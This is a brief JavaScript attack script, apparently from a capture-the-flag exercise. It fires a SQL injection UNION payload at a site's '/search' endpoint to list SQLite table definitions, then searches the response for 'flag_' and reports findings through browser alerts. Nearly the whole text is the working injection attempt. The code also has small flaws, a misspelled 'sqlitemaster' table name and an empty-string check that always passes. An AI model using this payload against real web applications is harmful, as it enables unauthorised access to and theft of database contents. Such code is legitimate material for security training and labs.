async function tryAllEndpoints() {

   // 2. Try the search endpoint with SQLi
   try {
     const sqlQuery = "' UNION SELECT name, sql FROM sqlitemaster WHERE type='table' --";
     const searchResp = await fetch('/search?q=' + encodeURIComponent(sqlQuery));
     const searchData = await searchResp.text();
     alert('Search endpoint response length: ' + searchData.length);
     if (searchData.includes('') && searchData.includes('flag_')) {
       alert('Found promising data in search response!');
     }
   } catch (e) {
     alert('Error with search endpoint: ' + e.message);
   }

 }
 tryAllEndpoints();
